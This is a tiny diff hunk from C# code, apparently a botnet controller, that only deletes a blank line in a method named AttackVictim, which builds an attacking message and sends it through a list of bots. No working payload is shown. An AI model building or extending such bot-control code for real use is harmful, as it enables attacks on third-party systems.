@@ -51,7 +51,6 @@ namespace Shob
 
         internal void AttackVictim(byte[] iPAddress, byte[] port, byte[] text)
         {
-            
             byte[] msg = CreateAttackingMessage(iPAddress, port, text);
             foreach (KeyValuePair<int,Tuple<IPAddress, int>> entry in MyBots)
             {
